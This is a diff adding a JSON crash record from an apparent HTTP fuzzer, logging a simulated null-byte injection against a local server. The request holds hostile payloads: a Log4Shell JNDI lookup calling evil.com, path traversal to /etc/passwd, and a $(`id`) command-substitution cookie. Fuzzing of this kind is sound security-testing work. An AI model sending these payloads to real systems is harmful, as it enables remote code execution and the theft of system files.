@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:24.132666",
+  "crash_type": "null_byte_injection",
+  "payload": "TRACE /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Transfer-Encoding': '....//....//....//etc/passwd', 'X-Forwarded-For': '....//....//....//etc/passwd', 'Cookie': '$(`id`)', 'Content-Length': '0'}",
+  "payload_hash": "9c6919852d1cb852",
+  "request_method": "TRACE",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Transfer-Encoding": "....//....//....//etc/passwd",
+    "X-Forwarded-For": "....//....//....//etc/passwd",
+    "Cookie": "$(`id`)",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated null_byte_injection",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 814
+}
